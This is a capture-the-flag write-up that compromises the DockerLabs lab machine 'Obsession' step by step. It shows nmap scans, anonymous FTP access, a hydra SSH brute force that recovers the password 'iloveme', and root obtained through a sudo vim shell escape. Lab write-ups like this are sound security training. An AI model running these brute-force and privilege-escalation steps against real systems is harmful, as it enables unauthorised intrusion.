# Write Up Obsession

**Difficulty:** Super easy<br>  
**Link to dockerlabs:** https://dockerlabs.es/

## Setting up the environment
First of all, we deploy the machine using the script that comes when downloading it:
```
❯ chmod +x auto_deploy.sh
❯ sudo ./auto_deploy.sh obsession.tar
[sudo] contraseña para godack: 

	                   ##        .         
	             ## ## ##       ==         
	          ## ## ## ##      ===         
	      /""""""""""""""""\___/ ===       
	 ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	      \______ o          __/           
	        \    \        __/            
	         \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				    

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es -→ 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Once deployed, we create the folder `obsession-dockerlabs`, move inside, and use the *mkt* utility, which creates the folders *nmap*, *content*, *exploits* and *scripts*.

```
❯ mkdir obsession-dockerlabs
❯ cd obsession-dockerlabs
❯ mkt
❯ ls -l
drwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 content
drwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 exploits
drwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 nmap
drwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 scripts
```

## Reconnaissance
As usual, we start with a quick and stealthy scan on the victim’s IP to discover open ports. Then, we run a more thorough scan only on those ports (which makes it faster than scanning all 65k).

```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:11 CEST
Initiating ARP Ping Scan at 10:11
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 10:11, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:11
Scanning 172.17.0.2 [65535 ports]
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 10:11, 1.02s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000090s latency).
Scanned at 2025-08-19 10:11:18 CEST for 1s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Now we use the *extractPorts* utility to copy the ports to clipboard and perform a detailed scan:

```
❯ extractPorts allPorts
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 172.17.0.2
   5   │     [*] Open ports: 21,22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nmap -sCV -p21,22,80 172.17.0.2 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:12 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000053s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Russoski Coaching
```

Open ports: FTP (21), SSH (22), HTTP (80).

## Exploitation
Since FTP is open, we first check if *anonymous* login is allowed — and it is:

```
❯ ftp obsession
Connected to obsession.
220 (vsFTPd 3.0.5)
Name (obsession:godack): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Listing files shows two: *chat-gonza.txt* and *pendientes.txt*. We download and inspect them:

```
ftp> ls
229 Entering Extended Passive Mode (|||34980|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
226 Directory send OK.
ftp> get chat-gonza.txt
local: chat-gonza.txt remote: chat-gonza.txt
229 Entering Extended Passive Mode (|||11500|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |*************************************************************************|   667   3.78 MiB/s  00:00 ETA
226 Transfer complete.
667 bytes received in 00:00 (713.43 KiB/s)
ftp> get pendientes.txt
local: pendientes.txt remote: pendientes.txt
229 Entering Extended Passive Mode (|||63348|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |*************************************************************************|   315   1.98 MiB/s  00:00 ETA
226 Transfer complete.
315 bytes received in 00:00 (465.38 KiB/s)
```

From the contents, we deduce there are two possible users: **Gonza** and **Russoski**.

```
❯ cat chat-gonza.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: chat-gonza.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ [16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
   2   │ [16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
   3   │ [16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
   4   │ [21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
   5   │ [21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
   6   │ [22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ cat pendientes.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pendientes.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!
   2   │ 
   3   │ 2 Aumentar el precio de mis asesorías online en la Web!
   4   │ 
   5   │ 3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!
   6   │ 
   7   │ 4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
   8   │   permisos habilitados que no son del todo seguros..
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

While running brute force attacks with *hydra* on SSH for both users, we investigate the website. It seems Russoski is the main user, and indeed, *hydra* finds his password:

```
❯ hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://obsession
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-19 10:48:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://obsession:22/
[22][ssh] host: obsession   login: russoski   password: iloveme
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-19 10:49:34
```

We log in via SSH:

```
❯ ssh russoski@obsession
russoski@obsession's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.25-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
russoski@c1489df97f06:~$
```

## Privilege Escalation
For a more comfortable shell, we fix the tty:

```
script /dev/null -c bash
stty raw -echo; fg
reset xterm
export TERM=xterm
```

We check sudo permissions and exploit this to spawn a root shell:

```
russoski@c1489df97f06:~$ sudo -l
Matching Defaults entries for russoski on c1489df97f06:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on c1489df97f06:
    (root) NOPASSWD: /usr/bin/vim
russoski@c1489df97f06:~$ sudo vim -c ':!/bin/bash'

root@c1489df97f06:/home/russoski# whoami
root
root@c1489df97f06:/home/russoski# 
```

Root obtained!

## Lessons Learned
1. Scans with **nmap**
2. *Anonymous* login on the *FTP* port
3. Brute force attack with **hydra**
4. Privilege escalation with **vim**